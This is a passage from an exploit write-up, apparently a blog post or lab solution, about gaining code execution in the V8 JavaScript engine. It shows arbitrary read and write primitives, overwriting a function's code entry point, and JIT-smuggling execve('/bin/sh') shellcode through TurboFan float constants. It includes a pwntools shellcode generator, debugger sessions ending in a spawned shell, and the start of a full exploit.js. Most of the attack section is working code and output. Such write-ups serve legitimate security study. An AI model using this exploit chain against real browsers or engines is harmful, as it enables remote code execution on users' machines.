&lt;span style="color:#a6e22e">oob&lt;/span>[&lt;span style="color:#ae81ff">6&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">itof&lt;/span>((&lt;span style="color:#a6e22e">a&lt;/span> &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">p&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">ftoi&lt;/span>(&lt;span style="color:#a6e22e">flt&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>]);
}
&lt;span style="color:#75715e">/* 64-bit write primitive */&lt;/span>
&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">write&lt;/span>(&lt;span style="color:#a6e22e">p&lt;/span>, &lt;span style="color:#a6e22e">x&lt;/span>) {
&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ftoi&lt;/span>(&lt;span style="color:#a6e22e">oob&lt;/span>[&lt;span style="color:#ae81ff">6&lt;/span>]) &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>;
&lt;span style="color:#a6e22e">oob&lt;/span>[&lt;span style="color:#ae81ff">6&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">itof&lt;/span>((&lt;span style="color:#a6e22e">a&lt;/span> &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">p&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>);
&lt;span style="color:#a6e22e">flt&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">itof&lt;/span>(&lt;span style="color:#a6e22e">x&lt;/span>);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="33-redirecting-code-execution">3.3. Redirecting Code Execution&lt;/h3>
&lt;p>Now we can finally move on to the interesting part! How, given that we are in this heap sandbox, can we redirect code execution? Not necessarily to a place we control, but just to any arbitrary location.&lt;/p>
&lt;p>Well, maybe it&amp;rsquo;s possible to corrupt a Function object. We can start by creating a function &lt;code>foo&lt;/code> and printing it&amp;rsquo;s debug information in order to dig around in memory.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">foo&lt;/span> &lt;span style="color:#f92672">=&lt;/span> () =&amp;gt; {
&lt;span style="color:#66d9ef">return&lt;/span>;
}
&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#a6e22e">DebugPrint&lt;/span>(&lt;span style="color:#a6e22e">foo&lt;/span>);
&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#a6e22e">SystemBreak&lt;/span>();
&lt;span style="color:#a6e22e">foo&lt;/span>();
&lt;/code>&lt;/pre>&lt;/div>&lt;p>In the debug information below, we can see that the Function object holds a pointer to some &lt;code>code&lt;/code> object at an offset of &lt;code>0x18&lt;/code>. This is where the code metadata must be stored.&lt;/p>
&lt;p>We can print this object in gdb using the &lt;code>job&lt;/code> command (provided the V8 config is in &lt;code>.gdbinit&lt;/code>).&lt;/p>
&lt;pre>&lt;code>DebugPrint: 0x31df0004b9cd: [Function]
- map: 0x31df00184241 &amp;lt;Map[28](HOLEY_ELEMENTS)&amp;gt; [FastProperties]
- prototype: 0x31df001840f5 &amp;lt;JSFunction (sfi = 0x31df00145df5)&amp;gt;
- elements: 0x31df00002259 &amp;lt;FixedArray[0]&amp;gt; [HOLEY_ELEMENTS]
- function prototype: &amp;lt;no-prototype-slot&amp;gt;
- shared_info: 0x31df00199f41 &amp;lt;SharedFunctionInfo foo&amp;gt;
- name: 0x31df00199ea5 &amp;lt;String[3]: #foo&amp;gt;
- builtin: CompileLazy
- formal_parameter_count: 0
- kind: ArrowFunction
- context: 0x31df0019a015 &amp;lt;ScriptContext[3]&amp;gt;
- code: 0x31df001467e5 &amp;lt;CodeDataContainer BUILTIN CompileLazy&amp;gt;
- source code: () =&amp;gt; {
return;
}
...
&lt;/code>&lt;/pre>&lt;p>There&amp;rsquo;s a code entry point field stored at an offset of &lt;code>0xc&lt;/code>, and sure enough it&amp;rsquo;s an external address. Viewing the memory at this object&amp;rsquo;s location it shows that this external pointer is stored in the object itself - it&amp;rsquo;s not an index to the external pointer table.&lt;/p>
&lt;p>This means we should be able to overwrite it and redirect code execution to an arbitrary address when this &lt;code>foo&lt;/code> function is called.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; job 0x31df001467e5
0x31df001467e5: [CodeDataContainer] in OldSpace
- map: 0x31df00002a71 &amp;lt;Map[28](CODE_DATA_CONTAINER_TYPE)&amp;gt;
- kind: BUILTIN
- builtin: CompileLazy
- is_off_heap_trampoline: 1
- code: 0
- code_entry_point: 0x55f3898c21c0
- kind_specific_flags: 0
pwndbg&amp;gt; x/4gx 0x31df001467e5-1
0x31df001467e4: 0x000023e100002a71 0x898c21c000000000
0x31df001467f4: 0x00590032000055f3 0x00002a7100000000
pwndbg&amp;gt; x/gx 0x31df001467e5-1+0xc
0x31df001467f0: 0x000055f3898c21c0
&lt;/code>&lt;/pre>&lt;p>Replacing the &lt;code>code_entry_point&lt;/code> pointer with the value &lt;code>0x6161616161616161&lt;/code> and continuing in gdb proves the above theory. We&amp;rsquo;ve managed to redirect code execution to an arbitrary address.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; set *(int64_t *)(0x31df001467e5-1+0xc) = 0x6161616161616161
pwndbg&amp;gt; job 0x31df001467e5
0x31df001467e5: [CodeDataContainer] in OldSpace
- map: 0x31df00002a71 &amp;lt;Map[28](CODE_DATA_CONTAINER_TYPE)&amp;gt;
- kind: BUILTIN
- builtin: CompileLazy
- is_off_heap_trampoline: 1
- code: 0
- code_entry_point: 0x6161616161616161
- kind_specific_flags: 0
pwndbg&amp;gt; c
...
â–º 0x55f3898b6c5f &amp;lt;Builtins_CallFunction_ReceiverIsAny+287&amp;gt; jmp rcx &amp;lt;0x6161616161616161&amp;gt;
&lt;/code>&lt;/pre>&lt;h3 id="34-writing-shellcode">3.4. Writing Shellcode&lt;/h3>
&lt;p>There&amp;rsquo;s just one more thing we need before we can get arbitrary code execution. We just need to find a way to write some shellcode to executable memory.&lt;/p>
&lt;p>This is an interesting problem, especially since the previously very useful wasm &lt;code>rwx&lt;/code> page is write-protected in modern V8, and since we can no longer write data outside of the heap via an ArrayBuffer object due to the heap sandbox.&lt;/p>
&lt;p>This is actually solved fairly easily, because TurboFan JIT compiles immediate numbers (such as floats) into &lt;code>movabs &amp;lt;reg&amp;gt;, &amp;lt;val&amp;gt;&lt;/code> instructions - we can use this to place small pockets of shellcode in executable memory.&lt;/p>
&lt;p>Let&amp;rsquo;s force TurboFan to compile a function that returns an array of floats.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">foo&lt;/span> &lt;span style="color:#f92672">=&lt;/span> () =&amp;gt; {
&lt;span style="color:#66d9ef">return&lt;/span> [&lt;span style="color:#ae81ff">1.1&lt;/span>, &lt;span style="color:#ae81ff">2.2&lt;/span>, &lt;span style="color:#ae81ff">3.3&lt;/span>, &lt;span style="color:#ae81ff">4.4&lt;/span>];
}
&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#a6e22e">PrepareFunctionForOptimization&lt;/span>(&lt;span style="color:#a6e22e">foo&lt;/span>);
&lt;span style="color:#a6e22e">foo&lt;/span>();
&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#a6e22e">OptimizeFunctionOnNextCall&lt;/span>(&lt;span style="color:#a6e22e">foo&lt;/span>);
&lt;span style="color:#a6e22e">foo&lt;/span>();
&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#a6e22e">DebugPrint&lt;/span>(&lt;span style="color:#a6e22e">foo&lt;/span>);
&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#a6e22e">SystemBreak&lt;/span>();
&lt;/code>&lt;/pre>&lt;/div>&lt;p>One interesting thing to note is that the CodeDataContainer object has changed from a &lt;code>BUILTIN CompileLazy&lt;/code> object to a &lt;code>TURBOFAN&lt;/code> object. It&amp;rsquo;s pretty clear that TurboFan has compiled this function.&lt;/p>
&lt;pre>&lt;code>DebugPrint: 0x301d0004ba31: [Function]
- map: 0x301d00184241 &amp;lt;Map[28](HOLEY_ELEMENTS)&amp;gt; [FastProperties]
- prototype: 0x301d001840f5 &amp;lt;JSFunction (sfi = 0x301d00145df5)&amp;gt;
- elements: 0x301d00002259 &amp;lt;FixedArray[0]&amp;gt; [HOLEY_ELEMENTS]
- function prototype: &amp;lt;no-prototype-slot&amp;gt;
- shared_info: 0x301d00199f95 &amp;lt;SharedFunctionInfo foo&amp;gt;
- name: 0x301d00199ea5 &amp;lt;String[3]: #foo&amp;gt;
- formal_parameter_count: 0
- kind: ArrowFunction
- context: 0x301d0019a07d &amp;lt;ScriptContext[3]&amp;gt;
- code: 0x301d0019a1fd &amp;lt;CodeDataContainer TURBOFAN&amp;gt;
- source code: () =&amp;gt; {
return [1.1, 2.2, 3.3, 4.4];
}
...
&lt;/code>&lt;/pre>&lt;p>Viewing the instructions stored at the code entry point we can see that our immediate numbers have all been compiled to &lt;code>movabs r10, &amp;lt;val&amp;gt;&lt;/code> instructions.&lt;/p>
&lt;p>This is how we&amp;rsquo;ll get arbitrary data into executable memory. The idea behind this technique is to chain these little pockets of controlled executable data into usable shellcode.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; job 0x301d0019a1fd
0x301d0019a1fd: [CodeDataContainer] in OldSpace
- map: 0x301d00002a71 &amp;lt;Map[28](CODE_DATA_CONTAINER_TYPE)&amp;gt;
- kind: TURBOFAN
- is_off_heap_trampoline: 0
- code: 0x55cdc0004001 &amp;lt;Code TURBOFAN&amp;gt;
- code_entry_point: 0x55cdc0004040
- kind_specific_flags: 4
pwndbg&amp;gt; x/40i 0x55cdc0004040
...
0x55cdc00040a7: movabs r10,0x3ff199999999999a
0x55cdc00040b1: vmovq xmm0,r10
0x55cdc00040b6: vmovsd QWORD PTR [rcx+0x7],xmm0
0x55cdc00040bb: movabs r10,0x400199999999999a
0x55cdc00040c5: vmovq xmm0,r10
0x55cdc00040ca: vmovsd QWORD PTR [rcx+0xf],xmm0
0x55cdc00040cf: movabs r10,0x400a666666666666
0x55cdc00040d9: vmovq xmm0,r10
0x55cdc00040de: vmovsd QWORD PTR [rcx+0x17],xmm0
0x55cdc00040e3: movabs r10,0x401199999999999a
...
&lt;/code>&lt;/pre>&lt;p>Here&amp;rsquo;s a little python script that will help us generate an &lt;code>execve(&amp;quot;/bin/sh&amp;quot;, 0, 0)&lt;/code> shellcode. Take particular note of the &lt;code>jmp 0xe&lt;/code> instruction appended to each chunk of shellcode. This will chain each section of shellcode to the next.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
context&lt;span style="color:#f92672">.&lt;/span>arch &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;amd64&amp;#39;&lt;/span>
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">convert&lt;/span>(x):
print(len(x))
jmp &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\xeb\x0c&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> &lt;span style="color:#75715e"># jmp 0xe&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> u64(x&lt;span style="color:#f92672">.&lt;/span>ljust(&lt;span style="color:#ae81ff">6&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x90&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> jmp)
imm &lt;span style="color:#f92672">=&lt;/span> [
asm(&lt;span style="color:#e6db74">&amp;#39;push SYS_execve; pop rax&amp;#39;&lt;/span>),
asm(&lt;span style="color:#e6db74">&amp;#39;push 0x0068732f; pop rbx&amp;#39;&lt;/span>), &lt;span style="color:#75715e"># &amp;#34;/sh\0&amp;#34;&lt;/span>
asm(&lt;span style="color:#e6db74">&amp;#39;push 0x6e69622f; pop rcx&amp;#39;&lt;/span>), &lt;span style="color:#75715e"># &amp;#34;/bin&amp;#34;&lt;/span>
asm(&lt;span style="color:#e6db74">&amp;#39;shl rbx, 0x20&amp;#39;&lt;/span>),
asm(&lt;span style="color:#e6db74">&amp;#39;add rbx, rcx; push rbx&amp;#39;&lt;/span>),
asm(&lt;span style="color:#e6db74">&amp;#39;mov rdi, rsp&amp;#39;&lt;/span>),
asm(&lt;span style="color:#e6db74">&amp;#39;xor rsi, rsi; xor rdx, rdx&amp;#39;&lt;/span>),
asm(&lt;span style="color:#e6db74">&amp;#39;syscall&amp;#39;&lt;/span>)
]
imm &lt;span style="color:#f92672">=&lt;/span> [convert(x) &lt;span style="color:#66d9ef">for&lt;/span> x &lt;span style="color:#f92672">in&lt;/span> imm]
log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>imm&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;span style="color:#e6db74">[
&lt;/span>&lt;span style="color:#e6db74"> 930996698553531242,
&lt;/span>&lt;span style="color:#e6db74"> 930937805292646248,
&lt;/span>&lt;span style="color:#e6db74"> 930936078731456360,
&lt;/span>&lt;span style="color:#e6db74"> 930996696683626824,
&lt;/span>&lt;span style="color:#e6db74"> 930996697537642824,
&lt;/span>&lt;span style="color:#e6db74"> 930996698562922824,
&lt;/span>&lt;span style="color:#e6db74"> 931068857101463880,
&lt;/span>&lt;span style="color:#e6db74"> 930996698557187343
&lt;/span>&lt;span style="color:#e6db74">]
&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We&amp;rsquo;ll also need a some Javascript code to convert these integers into their float representation, in order for them to be compiled into usable shellcode.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">bs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">ArrayBuffer&lt;/span>(&lt;span style="color:#ae81ff">8&lt;/span>);
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">fs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">Float64Array&lt;/span>(&lt;span style="color:#a6e22e">bs&lt;/span>);
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">is&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">BigUint64Array&lt;/span>(&lt;span style="color:#a6e22e">bs&lt;/span>);
&lt;span style="color:#75715e">/* converts a 64-bit uint to a float */&lt;/span>
&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">itof&lt;/span>(&lt;span style="color:#a6e22e">x&lt;/span>) {
&lt;span style="color:#a6e22e">is&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">x&lt;/span>;
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">fs&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>];
}
&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [
&lt;span style="color:#ae81ff">930996698553531242&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>,
&lt;span style="color:#ae81ff">930937805292646248&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>,
&lt;span style="color:#ae81ff">930936078731456360&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>,
&lt;span style="color:#ae81ff">930996696683626824&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>,
&lt;span style="color:#ae81ff">930996697537642824&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>,
&lt;span style="color:#ae81ff">930996698562922824&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>,
&lt;span style="color:#ae81ff">931068857101463880&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>,
&lt;span style="color:#ae81ff">930996698557187343&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>
];
&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; &lt;span style="color:#a6e22e">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#a6e22e">x&lt;/span>.&lt;span style="color:#a6e22e">length&lt;/span>; &lt;span style="color:#a6e22e">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>)
&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#a6e22e">itof&lt;/span>(&lt;span style="color:#a6e22e">x&lt;/span>[&lt;span style="color:#a6e22e">i&lt;/span>]));
&lt;span style="color:#75715e">/*
&lt;/span>&lt;span style="color:#75715e">[
&lt;/span>&lt;span style="color:#75715e"> 1.9711828979523134e-246,
&lt;/span>&lt;span style="color:#75715e"> 1.9562205631094693e-246,
&lt;/span>&lt;span style="color:#75715e"> 1.9557819155246427e-246,
&lt;/span>&lt;span style="color:#75715e"> 1.9711824228871598e-246,
&lt;/span>&lt;span style="color:#75715e"> 1.971182639857203e-246,
&lt;/span>&lt;span style="color:#75715e"> 1.9711829003383248e-246,
&lt;/span>&lt;span style="color:#75715e"> 1.9895153920223886e-246,
&lt;/span>&lt;span style="color:#75715e"> 1.971182898881177e-246
&lt;/span>&lt;span style="color:#75715e">]
&lt;/span>&lt;span style="color:#75715e">*/&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="35-executing-shellcode">3.5. Executing Shellcode&lt;/h3>
&lt;p>Now we have everything we need in order to achieve code execution - both the ability to redirect process execution to an arbitrary address, and the ability to write shellcode to executable memory.&lt;/p>
&lt;p>The below Javascript code can help demonstrate this in its entirety. With the first step being to get TurboFan to compile our function with our &amp;ldquo;shellcode&amp;rdquo;.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75715e">/* execve(&amp;#34;/bin/sh&amp;#34;, 0, 0); */&lt;/span>
&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">foo&lt;/span> &lt;span style="color:#f92672">=&lt;/span> () =&amp;gt; {
&lt;span style="color:#66d9ef">return&lt;/span> [
&lt;span style="color:#ae81ff">1.9711828979523134&lt;/span>&lt;span style="color:#a6e22e">e&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">246&lt;/span>,
&lt;span style="color:#ae81ff">1.9562205631094693&lt;/span>&lt;span style="color:#a6e22e">e&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">246&lt;/span>,
&lt;span style="color:#ae81ff">1.9557819155246427&lt;/span>&lt;span style="color:#a6e22e">e&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">246&lt;/span>,
&lt;span style="color:#ae81ff">1.9711824228871598&lt;/span>&lt;span style="color:#a6e22e">e&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">246&lt;/span>,
&lt;span style="color:#ae81ff">1.971182639857203&lt;/span>&lt;span style="color:#a6e22e">e&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">246&lt;/span>,
&lt;span style="color:#ae81ff">1.9711829003383248&lt;/span>&lt;span style="color:#a6e22e">e&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">246&lt;/span>,
&lt;span style="color:#ae81ff">1.9895153920223886&lt;/span>&lt;span style="color:#a6e22e">e&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">246&lt;/span>,
&lt;span style="color:#ae81ff">1.971182898881177&lt;/span>&lt;span style="color:#a6e22e">e&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">246&lt;/span>
];
}
&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#a6e22e">PrepareFunctionForOptimization&lt;/span>(&lt;span style="color:#a6e22e">foo&lt;/span>);
&lt;span style="color:#a6e22e">foo&lt;/span>();
&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#a6e22e">OptimizeFunctionOnNextCall&lt;/span>(&lt;span style="color:#a6e22e">foo&lt;/span>);
&lt;span style="color:#a6e22e">foo&lt;/span>();
&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#a6e22e">DebugPrint&lt;/span>(&lt;span style="color:#a6e22e">foo&lt;/span>);
&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#a6e22e">SystemBreak&lt;/span>();
&lt;span style="color:#a6e22e">foo&lt;/span>();
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Using gdb to print out the debug information for the code object, we can then disassemble the JITed &lt;code>foo&lt;/code> function. The array of floats has been converted into &lt;code>movabs r10, &amp;lt;val&amp;gt;&lt;/code> instructions, meaning the shellcode we need has been written to executable memory.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; job 0x02930019a215
0x2930019a215: [CodeDataContainer] in OldSpace
- map: 0x029300002a71 &amp;lt;Map[28](CODE_DATA_CONTAINER_TYPE)&amp;gt;
- kind: TURBOFAN
- is_off_heap_trampoline: 0
- code: 0x562f80004001 &amp;lt;Code TURBOFAN&amp;gt;
- code_entry_point: 0x562f80004040
- kind_specific_flags: 4
pwndbg&amp;gt; x/40i 0x562f80004040
...
0x562f800040a7: movabs r10,0xceb909090583b6a
0x562f800040b1: vmovq xmm0,r10
0x562f800040b6: vmovsd QWORD PTR [rcx+0x7],xmm0
0x562f800040bb: movabs r10,0xceb900068732f68
0x562f800040c5: vmovq xmm0,r10
0x562f800040ca: vmovsd QWORD PTR [rcx+0xf],xmm0
0x562f800040cf: movabs r10,0xceb906e69622f68
0x562f800040d9: vmovq xmm0,r10
0x562f800040de: vmovsd QWORD PTR [rcx+0x17],xmm0
0x562f800040e3: movabs r10,0xceb909090e78948
...
&lt;/code>&lt;/pre>&lt;p>The below gdb output shows the start of the shellcode. All that&amp;rsquo;s necessary at this point is to find the offset from the original function entry point to the start of our shellcode.&lt;/p>
&lt;p>This is needed as we want to overwrite the pointer of the original entry point with a pointer to our shellcode. This will allow us to redirect process execution to our shellcode.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; x/6i 0x562f800040a7+2
0x562f800040a9: push 0x3b
0x562f800040ab: pop rax
0x562f800040ac: nop
0x562f800040ad: nop
0x562f800040ae: nop
0x562f800040af: jmp 0x562f800040bd
pwndbg&amp;gt; p/x (0x562f800040a7+2)-0x562f80004040
$1 = 0x69
&lt;/code>&lt;/pre>&lt;pre>&lt;code>pwndbg&amp;gt; set *(int64_t *)(0x02930019a215-1+0xc) = 0x562f80004040+0x69
pwndbg&amp;gt; job 0x02930019a215
0x02930019a215: [CodeDataContainer] in OldSpace
- map: 0x029300002a71 &amp;lt;Map[28](CODE_DATA_CONTAINER_TYPE)&amp;gt;
- kind: TURBOFAN
- is_off_heap_trampoline: 0
- code: 0x562f80004001 &amp;lt;Code TURBOFAN&amp;gt;
- code_entry_point: 0x562f800040a9
- kind_specific_flags: 4
...
pwndbg&amp;gt; c
Continuing.
[Thread 0x7f07a4162700 (LWP 288626) exited]
[Thread 0x7f07a4963700 (LWP 288625) exited]
[Thread 0x7f07a5164700 (LWP 288624) exited]
process 288620 is executing new program: /usr/bin/dash
$ id
&lt;/code>&lt;/pre>&lt;h3 id="36-building-an-exploit">3.6. Building an Exploit&lt;/h3>
&lt;p>At this point we have the majority of building blocks necessary to build a working exploit. The only missing component necessary to complete it is the part that overwrites the &lt;code>foo&lt;/code> function&amp;rsquo;s entry point.&lt;/p>
&lt;p>This is fairly trivial to implement, we find the address of the &lt;code>foo&lt;/code> function using our addrof primtive, before reading the pointer to its code object (stored at an offset of 0x18) via our arbitrary read primitive.&lt;/p>
&lt;p>We then use our arbitrary read primitive again, in order to find the pointer to the &lt;code>foo&lt;/code> function&amp;rsquo;s entry point (stored at an offset of 0xc). After this, we use our arbitrary write primitive to overwrite the entry point value to the start of our JITed shellcode.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75715e">/* get a pointer to the foo.code object */&lt;/span>
&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">code&lt;/span> &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#a6e22e">read&lt;/span>(&lt;span style="color:#a6e22e">addrof&lt;/span>(&lt;span style="color:#a6e22e">foo&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x18&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>) &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xffffffff&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>;
&lt;span style="color:#75715e">/* get the entry point of the compiled function */&lt;/span>
&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">entry&lt;/span> &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#a6e22e">read&lt;/span>(&lt;span style="color:#a6e22e">code&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0xc&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>));
&lt;span style="color:#75715e">/* overwrite the entry point with the start of the shellcode */&lt;/span>
&lt;span style="color:#a6e22e">write&lt;/span>(&lt;span style="color:#a6e22e">code&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0xc&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>, &lt;span style="color:#a6e22e">entry&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x69&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>);
&lt;span style="color:#a6e22e">foo&lt;/span>();
&lt;/code>&lt;/pre>&lt;/div>&lt;p>In the code below you can find the whole working exploit code. Note that some of the offsets in the primitives have changed - this was due to the &lt;code>foo&lt;/code> function being placed above the arrays on the heap.
&lt;div class="collapsable-code">
&lt;input id="2" type="checkbox" checked />
&lt;label for="2">
&lt;span class="collapsable-code__language">js&lt;/span>
&lt;span class="collapsable-code__title">exploit.js&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-js" >&lt;code>
var bs = new ArrayBuffer(8);
var fs = new Float64Array(bs);
var is = new BigUint64Array(bs);
/* converts a float to a 64-bit uint */
function ftoi(x) {
